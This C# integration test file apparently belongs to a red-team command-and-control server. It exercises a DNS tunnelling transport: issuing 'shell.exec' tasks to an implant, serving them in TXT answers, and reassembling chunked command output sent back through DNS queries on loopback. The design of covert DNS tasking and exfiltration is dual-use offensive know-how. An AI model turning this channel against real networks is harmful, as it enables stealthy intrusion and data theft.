        await using var env = await DnsTestEnv.StartAsync();
        var implant = await env.EnrollImplantAsync();
        using (var beacon = await WsBeaconClient.ConnectAsync(env.HttpPort, implant.Id.ToString()))
        {
        }

        await env.LoginAsync();
        var oversize = await env.Http.PostAsJsonAsync(
            $"/engagements/{implant.EngagementId}/tasks",
            new { ImplantId = implant.Id.ToString(), Verb = "shell.exec", Arguments = new string('a', 2048) });
        oversize.EnsureSuccessStatusCode();
        var oversizeBody = await oversize.Content.ReadFromJsonAsync<TaskIssuedBody>();

        var fits = await env.Http.PostAsJsonAsync(
            $"/engagements/{implant.EngagementId}/tasks",
            new { ImplantId = implant.Id.ToString(), Verb = "shell.exec", Arguments = "id" });
        fits.EnsureSuccessStatusCode();
        var fitsBody = await fits.Content.ReadFromJsonAsync<TaskIssuedBody>();

        var pollAnswer = await env.DnsQueryAsync(DnsContactNames.PollName(implant.Id, Zone));
        Assert.NotNull(pollAnswer);
        Assert.True(DnsContactNames.TryDecode(pollAnswer, out var framed));
        Assert.Equal((byte)'t', framed![0]);
        var taskRequest = TaskRequest.Parser.ParseFrom(framed[1..]);

        // The task that fits was served, not the queue head that cannot.
        Assert.Equal(fitsBody!.TaskId, taskRequest.TaskId);
        Assert.Equal("id", taskRequest.Arguments);

        // The oversized task stayed queued behind it, untouched.
        var parked = await env.Http.GetFromJsonAsync<TaskBody>(
            $"/engagements/{implant.EngagementId}/tasks/{oversizeBody!.TaskId}");
        Assert.NotNull(parked);
        Assert.Equal("Queued", parked!.Status);
    }

    [Fact]
    public async Task Retransmission_AGappedChunkDropRecoversOnReSend()
    {
        await using var env = await DnsTestEnv.StartAsync();
        var implant = await env.EnrollImplantAsync();
        // The implant opens its session on the WebSocket beacon first: DNS
        // refreshes a session, it does not handshake (the documented
        // transport tradeoff).
        using (var beacon = await WsBeaconClient.ConnectAsync(env.HttpPort, implant.Id.ToString()))
        {
        }

        await env.LoginAsync();
        var issued = await env.Http.PostAsJsonAsync(
            $"/engagements/{implant.EngagementId}/tasks",
            new { ImplantId = implant.Id.ToString(), Verb = "shell.exec", Arguments = "id" });
        issued.EnsureSuccessStatusCode();
        var issuedBody = await issued.Content.ReadFromJsonAsync<TaskIssuedBody>();

        var pollAnswer = await env.DnsQueryAsync(DnsContactNames.PollName(implant.Id, Zone));
        Assert.NotNull(pollAnswer);
        Assert.True(DnsContactNames.TryDecode(pollAnswer, out var framed));
        Assert.Equal((byte)'t', framed![0]);
        var taskRequest = TaskRequest.Parser.ParseFrom(framed[1..]);
        var task = Guid.TryParse(taskRequest.TaskId, out var tid) ? new TaskId(tid) : TaskId.New();

        // The gapped attempt: the middle chunk never crosses, so the
        // terminal reassembly drops whole -- the loss a datagram carrier
        // takes in stride, reported to the sender as an unconfirmed blob.
        var output = "uid=0(root) gid=0(root) groups=0(root)";
        var bytes = Encoding.UTF8.GetBytes(output);
        var chunks = Chunk(bytes, 10);
        Assert.True(chunks.Count >= 3);
        for (var i = 0; i < chunks.Count; i++)
        {
            if (i == 1)
                continue;
            await env.DnsQueryAsync(DnsContactNames.ResultName(
                implant.Id, task, succeeded: true, sequence: i, terminal: i == chunks.Count - 1, chunks[i], Zone));
        }
        var probe = await env.DnsQueryAsync(
            DnsContactNames.ProbeName(implant.Id, task, DnsContactNames.DeliverySha(bytes), Zone));
        Assert.NotNull(probe);
        Assert.True(DnsContactNames.TryDecode(probe, out var notYet));
        Assert.Equal((byte)'n', notYet![0]);
        var early = await env.Http.GetFromJsonAsync<TaskBody>(
            $"/engagements/{implant.EngagementId}/tasks/{taskRequest.TaskId}");
        Assert.NotNull(early);
        Assert.NotEqual("Completed", early!.Status);

        // The full re-send lands -- first-wins recording tolerates the
        // partial first attempt -- and the probe confirms the exact blob.
        for (var i = 0; i < chunks.Count; i++)
        {
            await env.DnsQueryAsync(DnsContactNames.ResultName(
                implant.Id, task, succeeded: true, sequence: i, terminal: i == chunks.Count - 1, chunks[i], Zone));
        }
        var fetched = await WaitUntilAsync(async () => await env.Http.GetFromJsonAsync<TaskBody>(
            $"/engagements/{implant.EngagementId}/tasks/{taskRequest.TaskId}"));
        Assert.NotNull(fetched);
        Assert.Equal("Completed", fetched!.Status);
        Assert.Equal(output, fetched.Output);
        var confirmed = await env.DnsQueryAsync(
            DnsContactNames.ProbeName(implant.Id, task, DnsContactNames.DeliverySha(bytes), Zone));
        Assert.NotNull(confirmed);
        Assert.True(DnsContactNames.TryDecode(confirmed, out var yes));
        Assert.Equal((byte)'y', yes![0]);

        // A different blob under the same task stays unconfirmed: the probe
        // names the exact bytes, not just the task.
        var other = await env.DnsQueryAsync(
            DnsContactNames.ProbeName(implant.Id, task, DnsContactNames.DeliverySha(Encoding.UTF8.GetBytes("forged")), Zone));
        Assert.NotNull(other);
        Assert.True(DnsContactNames.TryDecode(other, out var no));
        Assert.Equal((byte)'n', no![0]);
    }

    private static List<byte[]> Chunk(byte[] bytes, int size)
    {
        var chunks = new List<byte[]>();
        for (var offset = 0; offset < bytes.Length; offset += size)
        {
            var end = Math.Min(offset + size, bytes.Length);
            var slice = new byte[end - offset];
            Array.Copy(bytes, offset, slice, 0, slice.Length);
            chunks.Add(slice);
        }
        return chunks;
    }

    // The Tier 1 verification an implant performs (extending/implants.md):
    // RSASSA-PSS/SHA-256 over the canonical little-endian length-prefixed
    // tuple, verified with the CA's public key.
    private static bool VerifyTasking(X509Certificate2 ca, string implantId, TaskRequest request)
    {
        using var rsa = ca.GetRSAPublicKey()!;
        var canonical = new MemoryStream();
        foreach (var value in new[] { implantId, request.TaskId, request.Verb, request.Arguments })
        {
            var bytes = Encoding.UTF8.GetBytes(value);
            canonical.Write(BitConverter.GetBytes((uint)bytes.Length), 0, 4);
            canonical.Write(bytes, 0, bytes.Length);
        }
        return rsa.VerifyData(
            canonical.ToArray(), request.Signature.Span,
            HashAlgorithmName.SHA256, RSASignaturePadding.Pss);
    }

    private static Frame HandshakeFrame(ImplantId implant)
    {
        var request = new HandshakeRequest
        {
            Version = new ProtocolVersion { Major = 1, Minor = 0 },
            ImplantId = implant.ToString(),
            Capabilities = { "shell.exec" },
        };
        return new Frame { Payload = ByteString.CopyFrom(request.ToByteArray()) };
    }

    // Builds one query datagram of the asked type: header, question, and an
    // EDNS0 OPT record so the response may carry the signed TaskRequest.
    private static byte[] BuildQuery(ushort id, string name, ushort type = DnsCodec.TxtType)
    {
        var buffer = new List<byte>(128);
        buffer.Add((byte)(id >> 8));
        buffer.Add((byte)id);
        buffer.Add(0); // flags: query, recursion desired
        buffer.Add(1);
        buffer.Add(0); buffer.Add(1); // qdcount
        buffer.Add(0); buffer.Add(0);
        buffer.Add(0); buffer.Add(0);
        buffer.Add(0); buffer.Add(1); // arcount: the OPT record

        foreach (var label in name.Split('.'))
        {
            buffer.Add((byte)label.Length);
            buffer.AddRange(Encoding.ASCII.GetBytes(label));
        }
        buffer.Add(0);
        buffer.Add((byte)(type >> 8));
        buffer.Add((byte)type);
        buffer.Add(0); buffer.Add(1);

        // OPT: root name, type 41, class = payload size, no data.
        buffer.Add(0);
        buffer.Add(0); buffer.Add(41);
        buffer.Add(4); buffer.Add(208); // 1232
        buffer.Add(0); buffer.Add(0); buffer.Add(0); buffer.Add(0);
        buffer.Add(0); buffer.Add(0);
        return buffer.ToArray();
    }

    private static async Task<T?> WaitUntilAsync<T>(Func<Task<T?>> read) where T : class
    {
        var deadline = DateTimeOffset.UtcNow + TimeSpan.FromSeconds(5);
        while (DateTimeOffset.UtcNow < deadline)
        {
            var value = await read();
            if (value is not null && Matches(value))
                return value;
            await Task.Delay(25);
        }
        throw new TimeoutException("The DNS contact state was not observed in time.");
    }

    private static bool Matches<T>(T value) where T : class
        => value switch
        {
            TaskBody t => t.Status == "Completed",
            _ => true,
        };

    private sealed class TaskBody
    {
        public string Status { get; set; } = "";
        public string? Outcome { get; set; }
        public string? Output { get; set; }
    }

    private sealed class TaskIssuedBody
    {
        public string TaskId { get; set; } = "";
    }

    private sealed class ListenerBody
    {
        public string Transport { get; set; } = "";
        public string State { get; set; } = "";
        public string PublicEndpoint { get; set; } = "";
    }

    private sealed class ImplantBody
    {
        public string ImplantId { get; set; } = "";
        public bool IsOnline { get; set; }
    }

    /// <summary>
    /// A real teamserver with the HTTP operator API, the WebSocket beacon, and one
    /// DNS listener entry (a real UDP socket on a free loopback port, zone
    /// c2.example.test). The DNS client is the "from-scratch implant" half of
    /// the test: raw UDP with the codec's query builder and a TXT-answer
    /// parser, speaking nothing but the documented contract.
    /// </summary>
    private sealed class DnsTestEnv : IAsyncDisposable
    {
        public IHost Host { get; private set; } = null!;
        public HttpClient Http { get; private set; } = null!;
        public int HttpPort { get; private set; }
        public int DnsPort { get; private set; }
        private UdpClient _dns = null!;
        private IImplantCertificateAuthority _ca = null!;

        public static async Task<DnsTestEnv> StartAsync()
        {
            var env = new DnsTestEnv();
            env.HttpPort = FreePort();
            env.DnsPort = FreePort();

            var config = AuthenticatedHost.BuildConfig();
            env.Host = TransportHost.CreateHostBuilder(
                    configureServices: services => AuthenticatedHost.ComposeServices(services, config),
                    mapEndpoints: endpoints => AuthenticatedHost.ComposeEndpoints(endpoints),
                    configuration: config)
                .ConfigureWebHost(webBuilder => webBuilder
                    .UseRodListeners(new List<ListenerConfig>
                    {
                        new("test-dns", "dns", $"127.0.0.1:{env.DnsPort}", Zone),
                    })
                    .ConfigureKestrel(kestrel => kestrel.ListenLocalhost(env.HttpPort)))
                .Build();
            await env.Host.StartAsync();
            env._ca = env.Host.Services.GetRequiredService<IImplantCertificateAuthority>();

            env.Http = new HttpClient(new CookieHandler(new HttpClientHandler()))
            {
                BaseAddress = new Uri($"http://127.0.0.1:{env.HttpPort}"),
            };
            env._dns = new UdpClient();
            env._dns.Connect(IPAddress.Loopback, env.DnsPort);
            return env;
        }

        public IReadOnlyList<System.Security.Cryptography.X509Certificates.X509Certificate2> CaCertificates()
            => new[] { _ca.GetCaCertificate() };

        public async Task LoginAsync() => await AuthenticatedHost.LoginAsync(Http);

        public async Task<Implant> EnrollImplantAsync()
        {
            var implants = Host.Services.GetRequiredService<IImplantRepository>();
            var engagementId = await EngagementSetup.CreateOwnedEngagementAsync(Host);
            var implant = Implant.Enroll(
                ImplantId.New(), engagementId, DateTimeOffset.UtcNow.AddDays(30), ImplantClass.Implant, DateTimeOffset.UtcNow);
            await implants.SaveAsync(implant);
            return implant;
        }


        /// <summary>
        /// One contact exchange: send the query, read the answer, return the
        /// concatenated TXT strings (null when the answer carries none).
        /// </summary>
        public async Task<string?> DnsQueryAsync(string name)
        {
            var response = await DnsQueryRawAsync(name, DnsCodec.TxtType);
            return ParseTxtAnswer(response, name);
        }

        /// <summary>
        /// One exchange for any query type: the raw response datagram, for
        /// the assertions a TXT string parse cannot express (A-record
        /// rdata, rcodes outside the TXT path).
        /// </summary>
        public async Task<byte[]> DnsQueryRawAsync(string name, ushort type)
        {
            // A datagram exchange is one shot: under parallel-suite load the
            // very first send can race the listener's socket settling or its
            // answer can trail the window. One bounded retry -- the implant's
            /// own cycle retries the same way -- keeps the harness honest
            // without masking a dead listener (consecutive failures still
            // fail the test).
            for (var attempt = 0; ; attempt++)
            {
                var query = BuildQuery((ushort)Random.Shared.Next(1, ushort.MaxValue), name, type);
                await _dns.SendAsync(query, query.Length);

                using var timeout = new CancellationTokenSource(TimeSpan.FromSeconds(5));
                try
                {
                    return (await _dns.ReceiveAsync(timeout.Token)).Buffer;
                }
                catch (Exception ex) when (attempt < 2 && ex is SocketException or OperationCanceledException)
                {
                    await Task.Delay(100);
                }
            }
        }

        // Reads the first TXT answer's concatenated strings off a response.
        private static string? ParseTxtAnswer(byte[] datagram, string questionName)
        {
            if (datagram.Length < 12)
                return null;
            var ancount = (datagram[6] << 8) | datagram[7];
            if (ancount == 0)
                return null;
            var offset = 12;
            // Skip the question (uncompressed on our wire, but honor pointers).
            SkipName(datagram, ref offset);
            offset += 4;
            SkipName(datagram, ref offset);
            offset += 8; // answer type, class, ttl -- rdlength follows
            if (offset + 2 > datagram.Length)
                return null;
            var rdlength = (datagram[offset] << 8) | datagram[offset + 1];
            offset += 2;
            var end = offset + rdlength;
            var payload = new StringBuilder();
            while (offset < end && offset < datagram.Length)
            {
                var length = datagram[offset++];
                payload.Append(Encoding.ASCII.GetString(datagram, offset, length));
                offset += length;
            }
            _ = questionName;
            return payload.ToString();
        }

        private static void SkipName(byte[] datagram, ref int offset)
        {
            while (offset < datagram.Length)
            {
                var length = datagram[offset];
                if (length == 0)
                {
                    offset++;
                    return;
                }
                if ((length & 0xC0) == 0xC0)
                {
                    offset += 2;
                    return;
                }
                offset += 1 + length;
            }
        }

        public async ValueTask DisposeAsync()
        {
            _dns?.Dispose();
            Http?.Dispose();
            if (Host is not null)
                await Host.StopAsync();
            Host?.Dispose();
        }
    }

    private static int FreePort()
    {
        using var listener = new System.Net.Sockets.TcpListener(IPAddress.Loopback, 0);
        listener.Start();
        var port = ((IPEndPoint)listener.LocalEndpoint).Port;
        listener.Stop();
        return port;
    }
}
